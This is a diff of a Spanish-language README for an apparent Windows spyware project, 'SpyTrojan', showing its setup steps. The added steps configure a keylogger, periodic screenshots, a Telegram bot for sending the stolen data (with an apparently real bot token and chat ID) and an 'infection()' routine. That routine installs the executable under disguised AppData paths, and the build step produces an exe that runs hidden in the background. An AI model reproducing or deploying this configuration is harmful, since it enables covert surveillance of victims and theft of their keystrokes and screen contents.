@@ -171,17 +171,10 @@ El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución
 
 ## 3. Crear ejecutable del `InfectionFile.py` 
 
-Este Archivo se encargará de escribir en el registro de windows la configuración de nuestro virus, 
+Este Archivo se encargará de escribir en el registro de windows la configuración de nuestro software, 
 según estos datos, el software funcionará de una u otra manera. 
 
-![](https://imgur.com/IVJl4NH.png)
-![](https://imgur.com/aPNBra0.png)
-![](https://imgur.com/zqVuye3.png)
-![](https://imgur.com/4y9GVdF.png)
-![](https://imgur.com/BUrOyKn.png)
-![](https://imgur.com/b2JM7tt.png)
-
-* __Paso 1:__  Abrir el archivo `InfectionFile.py` 
+* __Paso 1:__  Abrir el archivo `InfectionFile.py` para edidarlo.
     
     <details>
     <summary> Ver código completo</summary>
@@ -226,16 +219,109 @@ según estos datos, el software funcionará de una u otra manera.
     ````
 </details> 
 
-* __Paso 2:__  Cambiar configuración del Keylogger
+* __Paso 2:__  Cambiar configuración del `AutoDestruction # No disposible en ésta versión`
 
     <details>
-    <summary> fgf</summary>
+    <summary> Ver código</summary>
+
+    ![](https://imgur.com/aPNBra0.png)
+
+    ````py
+    AutoDestruction(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\AutoDestruction',
+                        active=0,       # No disposible en ésta versión
+                        active_now=0,   # No disposible en ésta versión
+                        day=00,         # No disposible en ésta versión
+                        year=0000       # No disposible en ésta versión
+                        ).set_values()
+    ````
+
+</details> 
+
+* __Paso 3:__  Cambiar configuración del `BombWindows # No disposible en ésta versión`
+
+    <details>
+    <summary> Ver código</summary>
+
+    ![](https://imgur.com/zqVuye3.png)
+
+    ````py
+    BombWindows(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\BombWindows',
+                    active=0,   # No disposible en ésta versión
+                    active_now=0,   # No disposible en ésta versión
+                    day=00,         # No disposible en ésta versión
+                    year=0000       # No disposible en ésta versión
+                    ).set_values()
+    ````
+</details> 
+
+* __Paso 4:__  Cambiar configuración del `Keylogger`
+
+    <details>
+    <summary> Ver código</summary>
+
+    ![](https://imgur.com/4y9GVdF.png)
 
     ````py
     Keylogger(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Keylogger',
                 active=1,         # Keylogger Habilitado = 1 °° Keylogger Habilitado = 1
-                limit=150         #Cambie Aquí#
+                limit=150         # Limite de caracteres, al llegal al limite, envía el registro de teclas,el limite no puede pasar de 2000
                 ).set_values()
+    ````
+
+</details> 
+
+
+* __Paso 5:__  Cambiar configuración de `Screenshot`
+
+    <details>
+    <summary> Ver código</summary>
+
+    ![](https://imgur.com/BUrOyKn.png)
+
+    ````py
+    Screenshot(pathReg=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\Screenshot',
+                active=1,           # Screenhot Habilitado = 1 °° screenshot Habilitado = 1
+                intervalSeconds=15, # Intervalo en segundos de capturas de pantalla
+                cache_path='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Office\16.0\Floodgate\temp'
+                ).set_values()
+    ````
+
+</details> 
+
+* __Paso 6:__  Cambiar configuración de `TelegramBot`
+
+    <details>
+    <summary> Ver código</summary>
+
+    ![](https://imgur.com/b2JM7tt.png)
+
+    ````py
+    TelegramBot(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide\TelegramBot',
+                    id=["-1001322369457"],  # <= Ingrese su ID personal, o el ID de un grupo de telegram
+                    token="1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp8QM", # <= Ingrese token del bot
+                    ).set_values()
+    ````
+
+</details> 
+
+* __Paso 7:__  Cambiar configuración de `Software General`
+
+    <details>
+    <summary> Ver código</summary>
+
+    ![](https://imgur.com/IVJl4NH.png)
+
+    ````py
+    trojan = Trojan(path_registry=r'HKEY_CURRENT_USER\SOFTWARE\Microsoft\Hide',
+                        debug=0,    # No disposible en ésta versión
+                        delay=0,    # No disposible en ésta versión
+                        path_software='C:\\Users\\' + str(os.getlogin()) + r'\AppData\Local\Microsoft\Windows\Shell\temp', # No cambiar
+                        name_software= 'SpyTrojan.exe', # <= Ingrese el nombre del exe generado anteriormente:
+                        # Ejemplo: "SpyKeylogger.exe"
+                        username=str(os.getlogin()) # No cambiar
+                        )
+        trojan.set_values()
+        trojan.infection()
     ````
 
 </details> 
@@ -243,7 +329,7 @@ según estos datos, el software funcionará de una u otra manera.
 
 
 
-* __Paso 2:__  Abrir el archivo y remplazar la infomación según tus requerimientos.txt
+* __Paso 8:__  Abrir el archivo y remplazar la infomación según tus requerimientos.txt
 
     ![lista de requerimientos](https://imgur.com/q79rmJb.png)
 
@@ -288,14 +374,14 @@ según estos datos, el software funcionará de una u otra manera.
 
 </details> 
 
-* __Paso 3:__  Convertir *.py a *.exe
+* __Paso 9:__  Convertir *.py a *.exe
 
     ![](https://imgur.com/1M7P0aW.png)
 
     <details>
     <summary>Ver más</summary>
-    <p>El archivo <code># Create .EXE [SpyTrojan]-[Debug].bat</code> nos dará como resultado un *.exe pero al ejecutar el programa se mostrará la consola, con la finalidad de debuggear el programa</p>
-    <p> El archivo <code># Create .EXE [SpyTrojan]-[Release].bat</code> es el software final, está se ejeuctará en segundo plano sin entorno grafico o consola. </p>
+    <p>El archivo <code># Create .EXE [InfectionFile]-[Debug].bat</code> nos dará como resultado un *.exe pero al ejecutar el programa se mostrará la consola, con la finalidad de debuggear el programa</p>
+    <p> El archivo <code># Create .EXE [InfectionFile]-[Release].bat</code> es el software final, está se ejeuctará en segundo plano sin entorno grafico o consola. </p>
     <br>
     <b>El ejecutable resultante se guardará en una carpeta con los nombres <code>[DEBUG]</code>, <code>[RELEASE]</code> según sea el caso.</b>
 
@@ -435,21 +521,18 @@ __Explicación:__
 [-] Se eliminó soporte de envio mediante una conexión a base de datos
 [-] Se eliminó soporte de envio mediante Gmail
 [-] 
-[-]
-[-]
-[-]
-[+]
-[+] 
-[+]
-[+]
 [+]
 
 ````
 
+
+## Bibliotecas personales utilizadas:
+- [CRUD RegeditWin](https://github.com/SebastianEPH/CRUD_RegeditWin_Python3) for Python 3
+
 ## By SebastianEPH
-__Nota:__ Contacteme solo si encontró un bug o desea aportar al repositorio, gracias.
+__Nota:__ Contacteme solo si encontró un bug o desea aportar al repositorio.
 
 - [Website](https://sebastianeph.github.io/)
 - [Github](https://github.com/SebastianEPH)
 - [Facebook](https://www.facebook.com/SebastianEPH)
-<!--- - [Telegram](https://t.me/sebastianeph) -->
+- [Telegram](https://t.me/sebastianeph)
